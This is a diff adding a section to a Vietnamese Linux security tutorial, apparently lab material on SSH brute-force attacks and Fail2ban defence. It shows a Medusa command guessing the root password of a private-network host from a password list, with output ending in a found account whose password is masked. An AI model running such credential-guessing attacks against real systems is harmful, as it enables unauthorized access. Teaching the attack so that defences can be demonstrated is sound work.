@@ -163,3 +163,25 @@ Last failed login: Fri Aug 21 14:15:33 +07 2020 from 172.16.2.193 on ssh:notty
 There were 15 failed login attempts since the last successful login.
 Last login: Fri Aug 21 11:48:55 2020 from 172.16.2.179
 ```
+
+### Trường hợp Medusa quét thành công
+
+```
+[root@localhost ~]# medusa -h 172.16.2.194 -u root -P password.txt -M ssh
+Medusa v2.1.1 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 123456 (1 of 235 complete)
+ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: password (2 of 235 complete)
+ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 123456789 (3 of 235 complete)
+ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: 12345678 (4 of 235 complete)
+ACCOUNT CHECK: [ssh] Host: 172.16.2.194 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: admin@123 (5 of 235 complete)
+ACCOUNT FOUND: [ssh] Host: 172.16.2.194 User: root Password: ********* [SUCCESS]
+```
+
+## Tài liệu tham khảo
+
+https://news.cloud365.vn/brute-force-password-su-dung-medusa/
+
+https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Brute%20Force/Brute%20Force%20Attack.md
+
+https://github.com/quanganh1996111/Linux-Tutorial/blob/master/Linux-Onjob%20Trainning/Security%20and%20Firewall/Fail2ban_with_CentOS7.md
